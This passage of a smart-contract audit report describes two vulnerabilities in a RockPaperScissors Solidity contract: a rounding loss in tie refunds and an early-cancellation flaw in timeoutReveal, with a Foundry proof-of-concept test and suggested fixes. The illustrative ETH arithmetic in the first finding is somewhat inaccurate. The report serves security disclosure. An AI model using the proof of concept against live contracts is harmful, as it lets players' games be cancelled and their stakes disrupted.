_Submitted by [0xshaedyw](https://profiles.cyfrin.io/u/0xshaedyw), [a39955720](https://profiles.cyfrin.io/u/a39955720), [grands9n47](https://profiles.cyfrin.io/u/grands9n47), [s3bc40](https://profiles.cyfrin.io/u/s3bc40), [feranmiola](https://profiles.cyfrin.io/u/feranmiola), [eagerpanda582](https://profiles.cyfrin.io/u/eagerpanda582), [staykovd](https://profiles.cyfrin.io/u/staykovd), [0xblackadam](https://profiles.cyfrin.io/u/0xblackadam), [matic68](https://profiles.cyfrin.io/u/matic68), [mishoko](https://profiles.cyfrin.io/u/mishoko). Selected submission by: [0xshaedyw](https://profiles.cyfrin.io/u/0xshaedyw)._      
            


## Summary

The `_handleTie() function` contains an integer division rounding error that causes permanent loss of ETH during tie resolution. This occurs when refunding players after deducting protocol fees from the total pot.

## Vulnerability Details

**Location:** `_handleTie()` function in RockPaperScissors.sol
Vulnerable Code:
```Solidity
uint256 fee = (totalPot * PROTOCOL_FEE_PERCENT) / 100;
uint256 refundPerPlayer = (totalPot - fee) / 2; // Problematic division
```

**PoC Scenario**

1\) Game Setup:

* Patrick bets: 52.5 ETH
* Dacian bets: 52.5 ETH
* Total pot: 105 ETH

2\) Tie Resolution
```Solidity
uint256 fee = (105 ether * 10) / 100; // 10.5 ETH
uint256 remaining = 105 ether - 10.5 ether; // 94.5 ETH
uint256 refundPerPlayer = remaining / 2; // 47.25 ETH → truncates to 47 ETH
```

3\) Result:

* Patrick receives: 47 ETH

* Dacian receives: 47 ETH

* Contract retains: 0.5 ETH (94 ETH distributed from 94.5 ETH remaining)

## Impact

* Progressive ETH accumulation in contract (0.5 ETH lost per tie at these stakes)

* Direct financial loss to players (violates exact refund principle)

## Tools Used

* Manual Calculation Review

## Recommendations
```Solidity
- uint256 fee = (totalPot * PROTOCOL_FEE_PERCENT) / 100;
- uint256 refundPerPlayer = (totalPot - fee) / 2;
// Fix: Precise percentage math
+ uint256 refundPerPlayer = (totalPot * (100 - PROTOCOL_FEE_PERCENT)) / 200;
```

or use Fixed-Point Arithmetic such as `mulDiv`

## <a id='L-03'></a>L-03. we can cancel the game even before the revealDeadline

_Submitted by [lucky2892000](https://profiles.cyfrin.io/u/lucky2892000). Selected submission by: [lucky2892000](https://profiles.cyfrin.io/u/lucky2892000)._      
            


## \[H-1] summary

we can cancel the game even before the revealDeadline

## vulnerability details

playerA creates the game and sent the gameId to playerB to participate. As there is flaw in this `RockPaperScissors::timeoutReveal` playerB can be able to cancel the game even before the deadline time and playerA who created the game itself cant participate in the game

-> if anyone know that the new games are created , they can able to participate and can be able to cancel the game instantly and thus by not playing the player who has created the game itself

Issue is in the below condition in `RockPaperScissors::timeoutReveal`

```solidity
       require(block.timestamp > game.revealDeadline, "Reveal phase not timed out yet");
```

if we can see that this `game.revealDeadline` will once be updated once both the player has been commited their moves , by default of this value is zero which make block.timestamp > game.revealDeadline condition to true

## POC

```solidity
    function testTimeoutRevealAttack() public {
        uint256 totalTurns = 3;
        uint256 timeoutInterval = 10 minutes;
        bytes32 _salt = bytes32(keccak256("salt"));
        RockPaperScissors.Move move = RockPaperScissors.Move.Paper;

        vm.prank(playerA);
        uint256 gameNum = game.createGameWithEth{value: 1 ether}(totalTurns, timeoutInterval);

        vm.startPrank(playerB);
        game.joinGameWithEth{value: 1 ether}(gameNum);
        bytes32 commit = keccak256(abi.encodePacked(move, _salt));
        game.commitMove(gameNum, commit);
        game.timeoutReveal(gameNum);
        vm.stopPrank();
        // here playerA can't commit his move
        vm.prank(playerA);
        game.commitMove(gameNum, commit);
    }
```

## impact - High

## likelyhood - High

## Recommendations

Update the `game.revealDeadline`, when atleast one of the player has been comitted his move

we need to update the condition in `RockPaperScissors::commitMove`

```diff
-  if (game.commitA != bytes32(0) && game.commitB != bytes32(0)) {
+  if (game.commitA != bytes32(0) || game.commitB != bytes32(0)) {
            game.revealDeadline = block.timestamp + game.timeoutInterval;
        }
```

NOTE: by changing to the above condition , there will be an issue with `RockPaperScissors::revealMove`

As we all know that once can only reveal only when both the players has been commmited

```diff
    function revealMove(uint256 _gameId, uint8 _move, bytes32 _salt) external {
        Game storage game = games[_gameId];

        require(msg.sender == game.playerA || msg.sender == game.playerB, "Not a player in this game");
        require(game.state == GameState.Committed, "Game not in reveal phase");
        require(block.timestamp <= game.revealDeadline, "Reveal phase timed out");
        require(_move >= 1 && _move <= 3, "Invalid move");
+       require(game.commitA != bytes32(0) && game.commitB != bytes32(0), "one of the player has not committed");

        .......
    }
```





    